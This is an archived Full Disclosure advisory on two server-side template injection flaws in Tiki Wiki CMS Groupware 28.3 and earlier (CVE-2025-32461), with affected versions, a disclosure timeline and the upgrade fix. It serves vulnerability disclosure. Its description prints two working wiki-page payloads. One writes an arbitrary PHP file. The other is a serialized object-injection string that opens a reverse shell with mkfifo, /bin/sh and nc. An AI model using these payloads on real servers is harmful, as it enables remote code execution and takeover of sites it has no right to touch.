---
title: Tiki Wiki CMS Groupware <= 28.3 Two Server-Side Template	Injection Vulnerabilities
url: https://seclists.org/fulldisclosure/2025/Jul/11
source: Full Disclosure
date: 2025-07-11
fetch_date: 2025-10-06T23:50:58.753880
---

# Tiki Wiki CMS Groupware <= 28.3 Two Server-Side Template	Injection Vulnerabilities

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](10)
[By Date](date.html#11)
[![Next](/images/right-icon-16x16.png)](12)

[![Previous](/images/left-icon-16x16.png)](10)
[By Thread](index.html#11)
[![Next](/images/right-icon-16x16.png)](12)

![](/shared/images/nst-icons.svg#search)

# Tiki Wiki CMS Groupware <= 28.3 Two Server-Side Template Injection Vulnerabilities

---

*From*: Egidio Romano <n0b0d13s () gmail com>
*Date*: Tue, 8 Jul 2025 12:02:03 +0200

---

```
----------------------------------------------------------------------------------
Tiki Wiki CMS Groupware <= 28.3 Two Server-Side Template Injection
Vulnerabilities
----------------------------------------------------------------------------------

[-] Software Link:

https://tiki.org

[-] Affected Versions:

Version 28.3 and prior 28.x versions.
Version 27.2 and prior 27.x versions.
Version 24.8 and prior 24.x versions.
Version 21.12 and prior 21.x versions.

[-] Vulnerabilities Description:

Tiki Wiki CMS Groupware is affected by two Server-Side Template Injection
(SSTI) vulnerabilities, which can be exploited by creating specially
crafted wiki pages.

The first vulnerability can be exploited by abusing the "customsearch"
plugin to, e.g., write arbitrary PHP files on the web server by using the
following as the source code for a wiki page:

{customsearch
tpl="string:{Nette\Utils\FileSystem::write('./evil.php','<?php
malicious_code(); ?>')}"}

The second vulnerability can be leveraged by abusing the "includetpl"
plugin to, e.g., carry out PHP Object Injection attacks, subsequently
leading to OS command execution on the web server, using the following as
the source code for a wiki page:

{includetpl
filename="eval:{Laminas\Ldap\Converter\Converter::fromLdapUnserialize('O:18:\"Search_MySql_Table\":1:{S:32:\"\00Search_MySql_Table\00schemaBuffer\";O:28:\"Search_Elastic_BulkOperation\":3:{S:35:\"\00Search_Elastic_BulkOperation\00count\";i:1;S:36:\"\00Search_Elastic_BulkOperation\00buffer\";S:83:\"rm
/tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 4444 >
/tmp/f\";S:38:\"\00Search_Elastic_BulkOperation\00callback\";S:6:\"system\";}}')}"}

Successful exploitation of these vulnerabilities requires an account with
permissions to create a wiki page and the "customsearch" or "includetpl"
plugins to be enabled.

[-] Solution:

Upgrade to version 28.4, 27.3, 24.9, or later.

[-] Disclosure Timeline:

[11/01/2025] - Vendor notified about the "customsearch" plugin vulnerability
[13/01/2025] - First vendor response
[15/01/2025] - Vendor notified about the "includetpl" plugin vulnerability
[27/03/2025] - Vendor attempted to fix the issues with new releases:
https://tiki.org/article517
[08/04/2025] - CVE identifier requested
[09/04/2025] - CVE identifier assigned
[10/04/2025] - Vendor informed of the ineffective fix
[18/06/2025] - Vendor resolved the issues with new releases:
https://tiki.org/article520
[08/07/2025] - Public disclosure

[-] CVE Reference:

The Common Vulnerabilities and Exposures project (cve.mitre.org) has
assigned the name CVE-2025-32461 to these vulnerabilities.

[-] Credits:

Vulnerabilities discovered by Egidio Romano.

[-] Original Advisory:

http://karmainsecurity.com/KIS-2025-03
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](10)
[By Date](date.html#11)
[![Next](/images/right-icon-16x16.png)](12)

[![Previous](/images/left-icon-16x16.png)](10)
[By Thread](index.html#11)
[![Next](/images/right-icon-16x16.png)](12)

### Current thread:

* **Tiki Wiki CMS Groupware <= 28.3 Two Server-Side Template Injection Vulnerabilities** *Egidio Romano (Jul 09)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")